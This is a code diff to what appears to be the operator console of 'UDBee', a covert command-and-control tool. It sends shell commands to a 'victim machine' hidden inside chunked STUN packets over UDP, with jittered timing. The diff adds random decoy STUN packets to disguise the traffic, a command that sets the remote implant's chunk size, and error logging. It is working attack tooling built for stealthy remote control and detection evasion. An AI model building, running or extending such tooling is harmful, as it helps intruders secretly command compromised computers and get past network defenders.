@@ -8,6 +8,9 @@ from prompt_toolkit import prompt
 from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.patch_stdout import patch_stdout
 from prompt_toolkit.shortcuts import print_formatted_text
+from dummy_packets import send_dummy_stun
+
+
 
 # Logging helpers for consistent output
 def log_info(msg): print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> {msg}"))
@@ -35,7 +38,6 @@ received_chunk_size = args.chunk * 1024  # Convert KB to bytes
 buffer_size = args.buffer
 max_data_allowed = buffer_size * received_chunk_size  # Maximum data size allowed in the buffer
 jitter = args.jitter
-total_data_size = 0
 target_pub_key = None
 my_pub_key = None
 my_priv_key = None
@@ -210,13 +212,15 @@ def send_command(message, listening_port):
         for chunk in chunks:
             chunk = build_stun_message(chunk)
             attacking_sock.sendto(chunk, (target_ip, target_port))
+            if random.choice([True, False]):
+                transmitted_messages += send_dummy_stun(target_ip, target_port, listening_port, target_pub_key, chunk_size, delay, jitter)
             # Add jitter to delay for covert timing
             jitter_delay = delay + random.uniform(-jitter, jitter)
             jitter_delay = max(0, jitter_delay)
             time.sleep(jitter_delay)
         attacking_sock.close()
     except Exception as e:
-        print(e)
+        log_error(f"<ansired>Failed to send command: {str(e)}</ansired>")
         
 
 def main():
@@ -247,7 +251,7 @@ def main():
                 sys.exit(1)
 
             elif command.lower() == "help":
-                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
+                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>target_chunk INT</ansigreen> : <ansiblue>control target chunk size (default is 20 bytes)</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                 continue
 
             elif command.startswith("gen_keys"):
@@ -266,6 +270,23 @@ def main():
                     continue
                 log_info(f"<ansiblue>Target public key:</ansiblue> <ansigreen>{target_pub_key}</ansigreen>")
                 continue
+            elif command.startswith("target_chunk"):
+                try:
+                    full_command = command.split()
+                    if len(full_command) != 2:
+                        log_error("<ansired>Invalid command format, use: target_chunk <INT></ansired>")
+                        continue
+                    chunk_size = int(full_command[1])
+                    if chunk_size <= 20:
+                        log_error("<ansired>Chunk size must be greater than 20 bytes.</ansired>")
+                        continue
+                    command_to_send = ''.join(i+' ' for i in full_command)
+                    listening_port = get_available_port()
+                    start_time = time.time()
+                    send_command(command_to_send, listening_port)
+                    get_response(listening_port, start_time)
+                except:
+                    log_error("<ansired>Chunk size should be an integer.</ansired>")
             else:
                 # Allow user to force command execution if it conflicts with a special command
                 if command.startswith("exec:"):
